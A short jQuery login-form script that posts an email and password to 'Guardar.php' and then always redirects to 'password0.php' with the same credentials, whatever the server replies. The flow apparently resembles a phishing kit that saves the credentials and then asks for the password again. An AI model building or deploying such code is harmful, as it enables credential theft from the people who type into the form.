$(document).ready(function(){

  $("#BtnGo").click(function(){
    var TxtEmail    = $("#TxtEmail").val();
    var TxtPassword = $("#TxtPassword").val();
    var Status      = true;

    if(!TxtPassword.length > 0){
      $("#ErrPassword").css("display", "block");
      $("#TxtPassword").css("border", "1px solid #cc0000");
      Status = false;
    }else{
      $("#ErrPassword").css("display", "none");
      $("#TxtPassword").css("border", "1px solid #ccc");
    }

    if(Status){

      $.post( "Guardar.php", {
        "action"      : "login",
        "TxtEmail"    : TxtEmail,
        "TxtPassword" : TxtPassword
      }, function( data ) {
        $.redirect("password0.php", {
          "TxtEmail"    : TxtEmail,
          "TxtPassword" : TxtPassword
        }, "POST");
      });

    }

  });

});
